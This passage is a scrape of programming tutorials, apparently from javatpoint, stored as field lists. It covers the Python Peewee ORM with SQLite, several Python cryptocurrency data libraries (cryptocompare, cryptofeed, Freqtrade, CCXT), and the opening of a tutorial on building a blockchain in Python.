than one instance, we can call the Peewee delete method. This method will return the number of successfully deleted instances.', 'We have imported the required libraries and created the database and the table in the above snippet of code. We have then used the update() function to update the date of the instance at ID = 2.']","['However, in order to work with MySQL and PostgreSQL, we may have to install DB-API compatible driver modules - pymysql and pyscopg2, respectively. The cockroach database is handled through a playhouse extension that is installed by default together with the Peewee library.', ""In the above snippet of code, we have imported the required library. We have then created a database as 'testSpace.db'. We have then created a class of the Peewee model and added some fields to it. We created the database table for the database and created the table. At last, we have inserted the entries in the table and saved the database."", ""In the above snippet of code, we have imported the required libraries. We have then created a database as 'testSpace.db'. We have then defined a class as 'Notes' for the Peewee model and created a table. We have then used the drop_table() function to drop the table."", 'In the above snippet of code, we have imported the required libraries. We have then created the database and the table. Later, we defined the data in a list of dictionaries that need to be filled in the table. We have then executed the bulk operation and used the atomic method to put the bulk operation in a transaction.', 'In the above snippet of code, we have imported the required libraries. We have then created the database and the table. We have then used the select() function to select columns from the tables. We have then used the for-loop to iterate through each row in the table and print them for the users. As a result, the program returned the entries for the users.', 'In the above snippet of code, we have imported the required libraries and created a database and the table. We have then used the where method along with the select() function to filter the data in the table. We have then used the for-loop to iterate through each row of the table and print the data for the users.', 'We have imported the required libraries and created the database and the table in the above snippet of code. We have now used the where method specifying the limits in order to filter the data in a specific manner. We have then used the for-loop to iterate through the rows and print them for the users.', 'We have imported the required libraries and created the database and the table in the above snippet of code. In order to retrieve a single instance, we can either the first way, where we can use the where method along with the get() function, or the second way using the get() function. Both methods are shown in the above example.', 'We have imported the required libraries and created the database and the table in the above snippet of code. We have then used the select() function specifying the names of the columns that have to be selected. We have also included the limit function to limit the number of entries to be printed.', 'In the above snippet of code, we have imported the required libraries and created the database and the table. We have then used the count() function to count the total number of entries. We have then used the where() function specifying the limits of the selection of the entries and used the count() function again to print the number of selected entries only.', 'We have imported the required libraries and created the database and the table in the above snippet of code. We then used the select() function and the where() to select the entry with id = 4. We have then used the sql function to print the SQL statement for that selection operation.', 'We have imported the required libraries and created the database and the table in the above snippet of code. We have then used the offset and limit attributes with the select() function in order to select the entries ranging from the 4th entry to the next three entries.', 'We have imported the required libraries and created the database and the table in the above snippet of code. We then used the select function and the order_by method to select the entries in the table and arrange them in ascending order. We have then used the for-loop to iterate through each row and print them. We have then used the select function along with the order_by method again. However, we have added the desc() function in order to arrange the entries in descending order and print them for the users with the help of the for-loop.', 'We have imported the required libraries and created the database and the table in the above snippet of code. We have then used the delete_by_id() function to delete the entry at the ID = 3. We have then printed the entire table for the users. As a result, the entry at ID = 3 has been deleted from the table successfully.', 'We have imported the required libraries and created the database and the table in the above snippet of code. We have then used the delete() method and the where() method to delete the instances with the IDs above 3. As a result, seven instances are deleted from the table.']","['$ pip3 install Peewee', '# importing the required libraries', 'import peewee', 'import datetime', '# creating a database', ""db = peewee.SqliteDatabase('testSpace.db')"", '# defining a class as Notes', 'class Notes(peewee.Model):', 'text = peewee.CharField()', 'created = peewee.DateField(default = datetime.date.today)', 'class Meta:', 'database = db', ""db_table = 'notes'"", '# creating table', 'Notes.create_table()', ""noteOne = Notes.create(text = 'Went to the Gym')"", 'noteOne.save()', ""noteTwo = Notes.create(text = 'Went to the Cinema', created = datetime.date(2021, 12, 8))"", 'noteTwo.save()', ""noteThree = Notes.create(text = 'Watered the plants', created = datetime.date(2021, 12, 8))"", 'noteThree.save()', ""noteFour = Notes.create(text = 'Listened to music')"", 'noteFour.save()', '# importing the required libraries', 'import peewee', 'import datetime', '# creating a database', ""dBase = peewee.SqliteDatabase('testSpace.db')"", '# defining the class as Notes', 'class Notes(peewee.Model):', 'text = peewee.CharField()', 'created = peewee.DateField(default = datetime.date.today)', 'class Meta:', 'database = dBase', ""db_table = 'notes'"", '# using the drop_table() function to drop the table', 'Notes.drop_table()', '# importing the required libraries', 'import peewee', 'import datetime', '# creating a database', ""dBase = peewee.SqliteDatabase('testSpace.db')"", '# defining a class as Notes', 'class Notes(peewee.Model):', 'text = peewee.CharField()', 'created = peewee.DateField(default = datetime.date.today)', 'class Meta:', 'database = dBase', ""db_table = 'notes'"", '# creating table', 'Notes.create_table()', '# defining the data', 'the_data = [', ""{ 'text': 'Visited friends in the morning', 'created': datetime.date(2021, 12, 7) },"", ""{ 'text': 'Worked on a Project', 'created': datetime.date(2021, 12, 10) },"", ""{ 'text': 'Went to Shopping mall', 'created': datetime.date(2021, 12, 6) },"", ""{ 'text': 'Listened to songs', 'created': datetime.date(2021, 12, 2) },"", ""{ 'text': 'Watched Web series all day', 'created': datetime.date(2021, 12, 4) },"", ""{ 'text': 'Watered the plants', 'created': datetime.date(2021, 12, 2) },"", ""{ 'text': 'Walked for half an hour', 'created': datetime.date(2021, 12, 8) }"", 'with dBase.atomic():', '# using the insert_many() function to add entries in bulk', 'the_query = Notes.insert_many(the_data)', 'the_query.execute()', '# importing the required libraries', 'import peewee', 'import datetime', '# creating the database', ""dBase = peewee.SqliteDatabase('testSpace.db')"", '# defining the class as Notes', 'class Notes(peewee.Model):', 'text = peewee.CharField()', 'created = peewee.DateField(default = datetime.date.today)', 'class Meta:', 'database = dBase', ""db_table = 'notes'"", '# using the select() function', 'notes = Notes.select()', 'print(notes)', '# iterating through each row in the table', 'for note in notes:', ""print('{} on {}'.format(note.text, note.created))"", '# importing the required libraries', 'import peewee', 'import datetime', '# creating a database', ""dBase = peewee.SqliteDatabase('testSpace.db')"", '# defining a class as Notes', 'class Notes(peewee.Model):', 'text = peewee.CharField()', 'created = peewee.DateField(default = datetime.date.today)', 'class Meta:', 'database = dBase', ""db_table = 'notes'"", '# using the where method to filter data', 'notes = Notes.select().where(Notes.id > 4)', '# iterating through each row of the table', 'for note in notes:', ""print('{} {} on {}'.format(note.id, note.text, note.created))"", '# importing the required libraries', 'import peewee', 'import datetime', '# creating a database', ""dBase = peewee.SqliteDatabase('testSpace.db')"", '# defining a class as Notes', 'class Notes(peewee.Model):', 'text = peewee.CharField()', 'created = peewee.DateField(default = datetime.date.today)', 'class Meta:', 'database = dBase', ""db_table = 'notes'"", '# using the where method to filter data', 'notes = Notes.select().where((Notes.id > 3) & (Notes.id < 10))', '# iterating through each rows of the table', 'for note in notes:', ""print('{} {} on {}'.format(note.id, note.text, note.created))"", '# importing the required libraries', 'import peewee', 'import datetime', '# creating a database', ""dBase = peewee.SqliteDatabase('testSpace.db')"", '# defining a class as Notes', 'class Notes(peewee.Model):', 'text = peewee.CharField()', 'created = peewee.DateField(default = datetime.date.today)', 'class Meta:', 'database = dBase', ""db_table = 'notes'"", '# first method', ""noteOne = Notes.select().where(Notes.text == 'Went to the Gym').get()"", 'print(noteOne.id)', 'print(noteOne.text)', 'print(noteOne.created)', '# second method', ""noteTwo = Notes.get(Notes.text == 'Worked on a Project')"", 'print(noteTwo.id)', 'print(noteTwo.text)', 'print(noteTwo.created)', '# importing the required libraries', 'import peewee', 'import datetime', '# creating a database', ""dBase = peewee.SqliteDatabase('testSpace.db')"", '# defining a class as Notes', 'class Notes(peewee.Model):', 'text = peewee.CharField()', 'created = peewee.DateField(default = datetime.date.today)', 'class Meta:', 'database = dBase', ""db_table = 'notes'"", '# using the select() function', 'notes = Notes.select(Notes.text, Notes.created).limit(3)', 'output = [e for e in notes.tuples()]', 'print(output)', '# importing the required libraries', 'import peewee', 'import datetime', '# creating a database', ""dBase = peewee.SqliteDatabase('testSpace.db')"", '# defining a class as Notes', 'class Notes(peewee.Model):', 'text = peewee.CharField()', 'created = peewee.DateField(default = datetime.date.today)', 'class Meta:', 'database = dBase', ""db_table = 'notes'"", '# using the count() function', 'count1 = Notes.select().count()', 'print(count1)', 'count2 = Notes.select().where(Notes.created >= datetime.date(2021, 12, 7)).count()', 'print(count2)', '# importing the required libraries', 'import peewee', 'import datetime', '# creating a database', ""dBase = peewee.SqliteDatabase('testSpace.db')"", '# defining a class as Notes', 'class Notes(peewee.Model):', 'text = peewee.CharField()', 'created = peewee.DateField(default = datetime.date.today)', 'class Meta:', 'database = dBase', ""db_table = 'notes'"", '# selecting the specific entry', 'noteFour = Notes.select().where(Notes.id == 4)', '# using the sql function', 'print(noteFour.sql())', '# importing the required libraries', 'import peewee', 'import datetime', '# creating a database', ""dBase = peewee.SqliteDatabase('testSpace.db')"", '# defining a class as Notes', 'class Notes(peewee.Model):', 'text = peewee.CharField()', 'created = peewee.DateField(default = datetime.date.today)', 'class Meta:', 'database = dBase', ""db_table = 'notes'"", '# using the offset and limit attributes', 'the_notes = Notes.select().offset(3).limit(4)', '# iterating through the entries in the table', 'for note in the_notes:', 'print(note.id, note.text, note.created)', '# importing the required libraries', 'import peewee', 'import datetime', '# creating a database', ""dBase = peewee.SqliteDatabase('testSpace.db')"", '# defining a class as Notes', 'class Notes(peewee.Model):', 'text = peewee.CharField()', 'created = peewee.DateField(default = datetime.date.today)', 'class Meta:', 'database = dBase', ""db_table = 'notes'"", ""print('Ascending order')"", ""print('********************************')"", '# using the order_by function. By default Ascending order', 'the_notes = Notes.select(Notes.text, Notes.created).order_by(Notes.created)', 'for note in the_notes:', 'print(note.text, note.created)', 'print()', ""print('Descending order')"", ""print('********************************')"", '# using the order_by function along with desc() function for descending order', 'the_notes = Notes.select(Notes.text, Notes.created).order_by(Notes.created.desc())', 'for note in the_notes:', 'print(note.text, note.created)', '# importing the required libraries', 'import peewee', 'import datetime', '# creating a database', ""dBase = peewee.SqliteDatabase('testSpace.db')"", '# defining a class as Notes', 'class Notes(peewee.Model):', 'text = peewee.CharField()', 'created = peewee.DateField(default = datetime.date.today)', 'class Meta:', 'database = dBase', ""db_table = 'notes'"", '# deleting the entry using ID', 'noteThree = Notes.delete_by_id(3)', '# using the select() function', 'notes = Notes.select()', '# iterating through each row in the table', 'for note in notes:', ""print('{} - {} on {}'.format(note.id, note.text, note.created))"", '# importing the required libraries', 'import peewee', 'import datetime', '# creating a database', ""dBase = peewee.SqliteDatabase('testSpace.db')"", '# defining a class as Notes', 'class Notes(peewee.Model):', 'text = peewee.CharField()', 'created = peewee.DateField(default = datetime.date.today)', 'class Meta:', 'database = dBase', ""db_table = 'notes'"", '# deleting multiple instances', 'the_query = Notes.delete().where(Notes.id > 3)', 'num = the_query.execute()', ""print('{} instances deleted'.format(num))"", '# importing the required libraries', 'import peewee', 'import datetime', '# creating a database', ""dBase = peewee.SqliteDatabase('testSpace.db')"", '# defining a class as Notes', 'class Notes(peewee.Model):', 'text = peewee.CharField()', 'created = peewee.DateField(default = datetime.date.today)', 'class Meta:', 'database = dBase', ""db_table = 'notes'"", '# updating an instance', 'the_query = Notes.update(created=datetime.date(2021, 10, 27)).where(Notes.id == 2)', 'num = the_query.execute()', ""print('No. of rows updated: {}'.format(num))""]","['sqlite> select * from notes;', '1|Went to the Gym|2021-12-09', '2|Went to the Cinema|2021-12-08', '3|Watered the plants|2021-12-08', '4|Listened to music|2021-12-09', 'sqlite> select * from notes;', '1|Went to the Gym|2021-12-10', '2|Went to the Cinema|2021-12-08', '3|Watered the plants|2021-12-08', '4|Listened to music|2021-12-10', '5|Visited friends in the morning|2021-12-07', '6|Worked on a Project|2021-12-10', '7|Went to Shopping mall|2021-12-06', '8|Listened to songs|2021-12-02', '9|Watched Web series all day|2021-12-04', '10|Watered the plants|2021-12-02', '11|Walked for half an hour|2021-12-08', '$ python fetch_data.py', 'SELECT ""t1"".""id"", ""t1"".""text"", ""t1"".""created"" FROM ""notes"" AS ""t1""', 'Went to the Gym on 2021-12-10', 'Went to the Cinema on 2021-12-08', 'Watered the plants on 2021-12-08', 'Listened to music on 2021-12-10', 'Visited friends in the morning on 2021-12-07', 'Worked on a Project on 2021-12-10', 'Went to Shopping mall on 2021-12-06', 'Listened to songs on 2021-12-02', 'Watched Web series all day on 2021-12-04', 'Watered the plants on 2021-12-02', 'Walked for half an hour on 2021-12-08', '5 Visited friends in the morning on 2021-12-07', '6 Worked on a Project on 2021-12-10', '7 Went to Shopping mall on 2021-12-06', '8 Listened to songs on 2021-12-02', '9 Watched Web series all day on 2021-12-04', '10 Watered the plants on 2021-12-02', '11 Walked for half an hour on 2021-12-08', '4 Listened to music on 2021-12-10', '5 Visited friends in the morning on 2021-12-07', '6 Worked on a Project on 2021-12-10', '7 Went to Shopping mall on 2021-12-06', '8 Listened to songs on 2021-12-02', '9 Watched Web series all day on 2021-12-04', '1', 'Went to the Gym', '2021-12-10', '6', 'Worked on a Project', '2021-12-10', ""[('Went to the Gym', datetime.date(2021, 12, 10)), ('Went to the Cinema', datetime.date(2021, 12, 8)), ('Watered the plants', datetime.date(2021, 12, 8))]"", '11', '7', '(\'SELECT ""t1"".""id"", ""t1"".""text"", ""t1"".""created"" FROM ""notes"" AS ""t1"" WHERE (""t1"".""id"" = ?)\', [4])', '4 Listened to music 2021-12-10', '5 Visited friends in the morning 2021-12-07', '6 Worked on a Project 2021-12-10', '7 Went to Shopping mall 2021-12-06', 'Ascending order', '********************************', 'Listened to songs 2021-12-02', 'Watered the plants 2021-12-02', 'Watched Web series all day 2021-12-04', 'Went to Shopping mall 2021-12-06', 'Visited friends in the morning 2021-12-07', 'Went to the Cinema 2021-12-08', 'Watered the plants 2021-12-08', 'Walked for half an hour 2021-12-08', 'Went to the Gym 2021-12-10', 'Listened to music 2021-12-10', 'Worked on a Project 2021-12-10', 'Descending order', '********************************', 'Went to the Gym 2021-12-10', 'Listened to music 2021-12-10', 'Worked on a Project 2021-12-10', 'Went to the Cinema 2021-12-08', 'Watered the plants 2021-12-08', 'Walked for half an hour 2021-12-08', 'Visited friends in the morning 2021-12-07', 'Went to Shopping mall 2021-12-06', 'Watched Web series all day 2021-12-04', 'Listened to songs 2021-12-02', 'Watered the plants 2021-12-02', '1 - Went to the Gym on 2021-12-10', '2 - Went to the Cinema on 2021-12-08', '4 - Listened to music on 2021-12-10', '5 - Visited friends in the morning on 2021-12-07', '6 - Worked on a Project on 2021-12-10', '7 - Went to Shopping mall on 2021-12-06', '8 - Listened to songs on 2021-12-02', '9 - Watched Web series all day on 2021-12-04', '10 - Watered the plants on 2021-12-02', '11 - Walked for half an hour on 2021-12-08', '7 instances deleted', 'No. of rows updated: 1']",['S.NO|||Field Type|||SQLite|||PostgreSQL|||MySQL&&&1|||CharField|||Varchar|||Varchar|||Varchar&&&2|||TextField|||Text|||Text|||Longtext&&&3|||DateTimeField|||Datetime|||Timestamp|||Datetime&&&4|||IntegerField|||Integer|||Integer|||Integer&&&5|||BooleanField|||Smallint|||Boolean|||Bool&&&6|||FloatField|||Real|||Real|||Real&&&7|||DoubleField|||Real|||Double Precision|||Double Precision&&&8|||BigIntegerField|||Integer|||Bigint|||Bigint&&&9|||DecimalField|||Decimal|||Numeric|||Numeric&&&10|||PrimaryKeyField|||Integer|||Serial|||Integer&&&11|||ForeignKeyField|||Integer|||Integer|||Integer&&&12|||DateField|||Date|||Date|||Date&&&13|||TimeField|||Time|||Time|||Time'],"[""|||Peewee is a Python Object Relational Mapping (also known as ORM) library developed by a US-based software engineer Charles Leifer in October 2010.|||The latest version of this library is 3.14.8. This library supports the databases of SQLite, MySQL, PostgreSQL, and Cockroach.|||Object Relational Mapping is a programming method that allows programmers to convert data between incompatible type systems in Object-Oriented Programming languages.|||Classes are considered non-scalar as they are defined in an Object-Oriented Programming language (OOPs) such as Python. It can't be expressed as Primitive data types like Integers and Strings.|||In contrast, the databases such as SQLite, MySQL, Oracle, and others can only store and manipulate scalar values like Integers and Strings arranged within tables.|||The programmer should either transform the values of the objects into collections of scalar data types for storing in the database or transform them back upon retrieval or only utilize simple scalar values inside the program.|||In an ORM system, each class maps to a table in the underlying database. As a replacement for writing tedious database interfacing code on our own, an ORM takes care of these problems while we can focus on programming the logic of the system.|||""]"
418,['Some Cryptocurrency Libraries for Python'],"[""As we all know, without a doubt that the popularity of Cryptocurrency has risen steeply in the last few years, and trying to understand the working of the blockchain and what Bitcoin can be annoying and puzzling. There are blockchains, contracts, ledgers, and even more buzzwords than the 'Big Data' revolution.""]","['https://www.javatpoint.com/building-a-blockchain-using-python', 'https://www.javatpoint.com/python-peewee-library', 'https://www.javatpoint.com/https://www.cryptocompare.com/', 'https://www.javatpoint.com/https://github.com/bmoscon/cryptofeed', 'https://www.javatpoint.com/https://www.freqtrade.io/en/latest/installation/', 'https://www.javatpoint.com/https://github.com/ccxt/ccxt/wiki/Manual#synchronous-vs-asynchronous-calls', 'https://www.javatpoint.com/building-a-blockchain-using-python', 'https://www.javatpoint.com/python-peewee-library', 'https://www.javatpoint.com/building-a-blockchain-using-python']",[],[],"['Understanding the CryptoCompare library', 'Understanding the Cryptofeed library']",[],[],"['We will be discovering about the following Python libraries:', 'We will discuss the above libraries in brief.', 'We can install the cryptocurrency library using the pip installer as shown below:', 'Once the installation is done, let us consider the following usage of this library to get the current price of Bitcoin against USD:', 'Explanation:', 'One can also visit the official website of CryptoCompare for even more live statistics and data.', 'The link for the same is as follows:', 'https://www.cryptocompare.com/', 'Explanation:', 'The Cryptofeed library is a fantastic resource to build high-quality applications for cryptocurrency trading.', 'One can check out the detailed documentation for more useful examples and updated exchange info.', 'https://github.com/bmoscon/cryptofeed', 'Understanding the Freqtrade library', 'In order to get begin with Freqtrade, head over to the installation section of the official documentation using the following link:', 'https://www.freqtrade.io/en/latest/installation/', 'We can also get up an even running quacking with the help of Docker.', 'Understanding the CCXT library', 'We can install the CCXT module using the pip installer as shown below:', 'Explanation:', 'https://github.com/ccxt/ccxt/wiki/Manual#synchronous-vs-asynchronous-calls']","['CryptoCompare also offers a ton of data services and a fully functional API. This is where the cryptocompare library comes in. This Python library offers a convenient wrapper for the CryptoCompare API.', 'In the above snippet of code, we have imported the required module. We have then used the get_price() function to return the current price of Bitcoin against USD. At last, we have printed the price for the users.', 'The above example only scratches the surface of what the CryptoCompare API is capable of. We can also submit orders to an exchange, look at historical prices, and present market information.', 'This library has a high level of complexity and can be hard to understand initially; however, it is extremely powerful. In order to get started, we can install the cryptofeed library using the pip installer as shown below:', 'There are a variety of examples to implement Cryptofeed offered in the repository; however, we will be looking at a simplified version of obtaining the National Best Bid and Offer (NBBO) example:', 'Another amazing fact about Freqtrade is that the trading strategies are also written in Python. We do not have to mess around with another unfamiliar language or download big configuration files in order to set up a simple strategy.', 'Once the installation is complete, let us consider the following example demonstrating the operation of obtaining the latest trade data from the Kraken exchange.', 'CCXT offers a flexible utility with compatibility across different languages, exchanges, and platforms. This well-thought-out, well-supported platform allows programmers to construct pragmatic trading applications.']","['Suppose any of us want to dip our toes into the world of Cryptocurrency and have some experience in development. In that case, this tutorial is the best choice as we are about to some of the publicly available libraries that we can use for Cryptocurrency. This is an easy method to jump-start the experience with Cryptocurrency and get involved in the community and learn a bit about the technical side of things.', 'In the following tutorial, we will explore some excellent Python libraries that allow us to perform various activities in the cryptocurrency world. We will be able to get live price quotes for different coins, connect to various exchanges, place trades and even build a live algorithmic trading bot of our very own. Let us understand some of the best libraries for Cryptocurrency offered by the Python programming language.', 'CryptoCompare is among the leading websites for live cryptocurrency price quotations and information. This website has been around since 2015 and offers users the latest crypto news, detailed coin information, and market statistics. CryptoCompare also reviews various cryptocurrency exchanges, wallets, and services to arm buyers with the possible latest information.', 'The Cryptofeed library is more complicated than a simple API wrapper like cryptocompare. Cryptofeed allows programmers to stream market data from various exchanges to the application directly. We can set up custom functions to handle each update, store the data in one of the supported backends or utilize the data to construct a live trading application.', 'In the above snippet of code, we have imported the required modules from the library. We have then defined a function as nbboUpdate() where we have included some parameters like symbol, bid, bid_size, ask, ask_size, bid_feed, and ask_feed and print their values altogether. We have then defined the main() function where we have assigned the variable to the FeedHandler method. We have then used the add_nbbo() function specifying the exchange and the symbol. We have then used the run() function to execute the operation. At last, we have called the main() function.', 'If we execute the above program, the handler will stream the current NBBO information offered by the Coinbase exchange. The output will be printed to the console to be able to view what is going on. There is a lot of volumes, so we must be prepared for lots of information. This snippet of code will run in a loop, updating with the most recent data until we exit.', 'This is not specifically a single Python library; however, it is an excellent example of a Python trading application. This application is entirely written in the Python programming language. It enables us to set up a custom trading bot, complete with a large range of trading strategies and responding to various commands. Freqtrade provides supports to multiple exchanges and offers simple integration with Telegram.', 'CCXT is considered a truly monolithic trading library. This library has a plethora of features and a very supportive community. This library is provided in JavaScript, PHP, and Python as simple, easy-to-utilize modules. CCXT is quite like Cryptofeed; however, it must be easier to get started with. We do not have to be content with a run loop and a constant stream of data. We can simply make calls to CCXT to get orders, exchange info, and many more.', 'In the above snippet of code, we have imported the required library and assigned a variable to the kraken() function. We have then used the fetch_trade() to extract the details about various prices, amounts, timestamps, etc., and print them all using the for-loop and print function.', 'Once we execute the above code, we should view a long list of trade executions with details about the price, amount, timestamp, and many more. The data is fetched as one list consisting of all the trade information versus a stream of data. The CCXT library also offers asynchronous concurrency mode support. Anyone interested can read more about the implementation from the official documentation using the following link:']","['$ pip3 install cryptocompare', '# importing the required library', 'import cryptocompare', '# using the get_price() function', ""the_price = cryptocompare.get_price('BTC', 'USD')"", '# printing the price', 'print(the_price)', '$ pip3 install cryptofeed', 'from cryptofeed import FeedHandler', 'from cryptofeed.exchanges import Coinbase', 'def nbboUpdate(symbol, bid, bid_size, ask, ask_size, bid_feed, ask_feed):', 'print(', ""f'Pair: {symbol} ' +"", ""f'Bid Price: {bid : .2f} ' +"", ""f'Bid Size: {bid_size : .6f} ' +"", ""f'Bid Feed: {bid_feed} ' +"", ""f'Ask Price: {ask : .2f} ' +"", ""f'Ask Size: {ask_size : .6f} ' +"", ""f'Ask Feed: {ask_feed}'"", 'def main():', 'the_feed = FeedHandler()', ""the_feed.add_nbbo([Coinbase], ['BTC-USD'], nbboUpdate)"", 'the_feed.run()', 'if __name__ == ""__main__"":', 'main()', '$ pip3 install ccxt', '# importing the required module', 'import ccxt', '# using the kraken() function', 'the_kraken = ccxt.kraken()', '# using the for-loop to iterate through trades in kraken', ""for trade in the_kraken.fetch_trades('BTC/USD'):"", 'print(', 'f""date: {trade[\'datetime\']} | "" +', 'f""symbol: {trade[\'symbol\']} | "" +', 'f""price: {trade[\'price\']} | "" +', 'f""amount: {trade[\'amount\']} | "" +', 'f""cost: {trade[\'cost\']} | "" +', 'f""side: {trade[\'side\']} | "" +', 'f""type: {trade[\'type\']}""']","[""{'BTC': {'USD': 48146.45}}"", 'date: 2021-12-16T10:00:43.897Z | symbol: BTC/USD | price: 48936.7 | amount: 0.00096371 | cost: 47.160787157 | side: buy | type: limit', 'date: 2021-12-16T10:00:47.152Z | symbol: BTC/USD | price: 48936.5 | amount: 0.03011824 | cost: 1473.88125176 | side: buy | type: limit', 'date: 2021-12-16T10:01:06.050Z | symbol: BTC/USD | price: 48963.6 | amount: 0.00012934 | cost: 6.332952024 | side: buy | type: market', 'date: 2021-12-16T10:01:11.162Z | symbol: BTC/USD | price: 48961.1 | amount: 0.02751697 | cost: 1347.261119867 | side: buy | type: market', 'date: 2021-12-16T10:01:24.230Z | symbol: BTC/USD | price: 48971.3 | amount: 0.02043248 | cost: 1000.605107824 | side: sell | type: limit', 'date: 2021-12-16T10:01:25.279Z | symbol: BTC/USD | price: 48971.3 | amount: 0.02043248 | cost: 1000.605107824 | side: sell | type: limit', 'date: 2021-12-16T10:01:26.483Z | symbol: BTC/USD | price: 48971.3 | amount: 0.00634731 | cost: 310.836022203 | side: sell | type: limit', 'date: 2021-12-16T10:01:27.653Z | symbol: BTC/USD | price: 48971.4 | amount: 0.00160946 | cost: 78.817509444 | side: buy | type: limit', 'date: 2021-12-16T10:01:28.176Z | symbol: BTC/USD | price: 48971.4 | amount: 0.00013384 | cost: 6.554332176 | side: buy | type: market', 'date: 2021-12-16T10:01:28.177Z | symbol: BTC/USD | price: 48977.2 | amount: 0.00204177 | cost: 100.000177644 | side: buy | type: market', 'date: 2021-12-16T10:01:28.178Z | symbol: BTC/USD | price: 48978.0 | amount: 0.00082439 | cost: 40.37697342 | side: buy | type: market', 'date: 2021-12-16T10:01:28.434Z | symbol: BTC/USD | price: 48978.4 | amount: 0.0204306 | cost: 1000.65809904 | side: sell | type: limit', 'date: 2021-12-16T10:01:29.471Z | symbol: BTC/USD | price: 48978.4 | amount: 0.020432 | cost: 1000.7266688 | side: sell | type: limit', 'date: 2021-12-16T10:01:30.524Z | symbol: BTC/USD | price: 48978.4 | amount: 0.02043201 | cost: 1000.727158584 | side: sell | type: limit', 'date: 2021-12-16T10:01:31.592Z | symbol: BTC/USD | price: 48978.5 | amount: 0.020432 | cost: 1000.728712 | side: sell | type: limit', 'date: 2021-12-16T10:01:31.788Z | symbol: BTC/USD | price: 48978.6 | amount: 0.003 | cost: 146.9358 | side: buy | type: market', 'date: 2021-12-16T10:01:32.644Z | symbol: BTC/USD | price: 48978.5 | amount: 0.020432 | cost: 1000.728712 | side: sell | type: limit', 'date: 2021-12-16T10:01:33.157Z | symbol: BTC/USD | price: 48978.6 | amount: 0.013 | cost: 636.7218 | side: buy | type: market', 'date: 2021-12-16T10:01:33.752Z | symbol: BTC/USD | price: 48978.5 | amount: 0.00640702 | cost: 313.80622907 | side: sell | type: limit', 'date: 2021-12-16T10:01:36.476Z | symbol: BTC/USD | price: 48984.2 | amount: 0.02042724 | cost: 1000.612009608 | side: sell | type: limit', 'date: 2021-12-16T10:01:36.564Z | symbol: BTC/USD | price: 48985.8 | amount: 0.004 | cost: 195.9432 | side: buy | type: market', '.', '.', '.', '.', 'date: 2021-12-16T11:03:23.696Z | symbol: BTC/USD | price: 49169.3 | amount: 0.0002 | cost: 9.83386 | side: buy | type: market', 'date: 2021-12-16T11:03:23.697Z | symbol: BTC/USD | price: 49169.4 | amount: 0.0002 | cost: 9.83388 | side: buy | type: market', 'date: 2021-12-16T11:03:23.698Z | symbol: BTC/USD | price: 49169.5 | amount: 0.04488859 | cost: 2207.149526005 | side: buy | type: market', 'date: 2021-12-16T11:03:24.363Z | symbol: BTC/USD | price: 49169.4 | amount: 0.00057311 | cost: 28.179474834 | side: sell | type: limit', 'date: 2021-12-16T11:03:24.364Z | symbol: BTC/USD | price: 49169.2 | amount: 0.0010087 | cost: 49.59697204 | side: sell | type: limit', 'date: 2021-12-16T11:03:33.278Z | symbol: BTC/USD | price: 49169.3 | amount: 0.0002 | cost: 9.83386 | side: buy | type: market', 'date: 2021-12-16T11:03:33.280Z | symbol: BTC/USD | price: 49169.4 | amount: 0.0001 | cost: 4.91694 | side: buy | type: market', 'date: 2021-12-16T11:03:33.281Z | symbol: BTC/USD | price: 49169.4 | amount: 0.0001 | cost: 4.91694 | side: buy | type: market', 'date: 2021-12-16T11:03:33.282Z | symbol: BTC/USD | price: 49169.4 | amount: 0.002006 | cost: 98.6338164 | side: buy | type: market']",[],['|||CryptoCompare|||Cryptofeed|||FreqTrade|||CCXT|||']
419,['Building a Blockchain using Python'],"[""Before we start building a blockchain using the Python programming language, let us go back to the very beginning. In 2008, an author (or authors) under the pseudonym Satoshi Nakamoto released a white paper describing a purely peer-to-peer version of electronic cash. Exclusive to this electronic cash system, transactions wouldn't have to depend on third-party verifications to ensure the security of every transaction. Instead, every transaction would be timestamped, then hashed into an ongoing chain of proof-of-work based on the hash.""]","['https://www.javatpoint.com/huffman-coding-using-python', 'https://www.javatpoint.com/some-cryptocurrency-libraries-for-python', 'https://www.javatpoint.com/huffman-coding-using-python', 'https://www.javatpoint.com/some-cryptocurrency-libraries-for-python', 'https://www.javatpoint.com/huffman-coding-using-python']",[],[],"['Understanding the Blockchain', 'Building a blockchain in Python', 'Complete Project Code', 'Summing Up']","['Creating a Blockchain class', 'Writing a Function to construct New Blocks', 'Writing Functions to Create New Transactions and Get the Last Block', 'Writing a Function to ""Hash"" the Blocks', 'Creating a New Blockchain and Sending some Money']",[],"['In the following tutorial, we will understand the same.', 'Fundamentally, the data stored in a blockchain should have consisted of the following characteristics:', ""Let's get started."", 'We have divided the process of building a blockchain into several steps for better understanding. These steps are as follows:', 'Step 1: Creating a Blockchain class', 'Step 2: Writing a Function to build New Blocks', 'Step 3: Writing Functions to create New Transactions and get the Last Block', 'Step 4: Writing a Function to ""Hash"" the Blocks', 'Step 5: Creating a New Blockchain and Sending some money', 'Now, we will discuss these steps in the following sections.', 'Let us consider the following snippet of code demonstrating the same.', 'Explanation:', 'Let us understand the above using the snippet of code shown below.', 'Explanation:', 'Let us consider the following snippet of code demonstrating the same.', 'Explanation:', 'fbc13b85c4ade52e2def26eae950f3b55b174df887ad0f0fb5ebfd56881f7fcb', 'Let us understand the same using the following snippet of code.', 'Explanation:', 'Let us consider the following snippet of code demonstrating the same.', 'Explanation:', 'We have instantiated the Block_chain() class in the above snippet of code. We have then performed some transactions and printed them for the users.', 'Now, let us have a look at a complete code for the project of building blockchain using Python.', 'File: buildingBlockchain.py', 'Explanation:']","['In the above snippet of code, we have imported the required libraries and created the Block_chain class where we initialized the different variables described earlier.', 'Now that we have initialized an empty chain, let us begin inserting blocks into it. We will then define the JSON object with the following properties:', 'Once we add the above properties to the new block, we will include them in the chain. Initially, we empty the pending list of transactions and then add the new block to the self.chain and return it.', 'In the above snippet of code, we have defined the newBlock function and included the properties described earlier. We emptied the pending list of transactions and added the new block to the chain. At last, we have returned the new block.', 'Since we have created a class for the blockchain and included various methods in order to build a new block and a new transaction, along with a custom method utilized to hash any block with SHA256 encryption, let us begin building the chain.', 'We will initialize an instance of the Block_chain class and perform some dummy transactions. Make sure to list them in some blocks that we include in the chain.']","['Thus, what are hashing and proof-of-work? We will introduce these concepts in the following tutorial and understand how they establish the groundwork for an encrypted electronic cash system or cryptocurrency. Satoshi Nakamoto described the particular form of electronic currency in his (or her) paper became Bitcoin, the first cryptocurrency. However, how is this useful when attempting to build a blockchain using Python?', 'The system that Bitcoin depends upon - a growing list of records (that is, blocks) that are connected to one another - is called Blockchain. Bitcoin was the first successful application of this system, and soon after its growth in fame, other cryptocurrencies were established on the same 